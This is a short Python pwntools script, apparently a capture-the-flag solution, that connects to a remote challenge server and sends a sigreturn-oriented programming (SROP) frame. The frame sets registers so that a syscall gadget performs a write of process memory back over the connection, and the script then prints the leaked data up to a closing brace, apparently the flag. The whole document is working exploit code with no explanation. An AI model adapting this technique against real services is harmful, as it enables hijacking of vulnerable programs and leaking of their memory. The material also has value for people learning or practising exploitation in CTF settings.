from pwn import *

r = remote('hack.bckdr.in', 17002)
syscall = 0x10000015

frame = SigreturnFrame(arch='amd64')
frame.rax = 1
frame.rdi = 1
frame.rsi = 0x10000023
frame.rdx = 0x200
frame.rip = syscall
exploit = str(frame)
r.sendline(exploit)
print r.recvuntil('}')

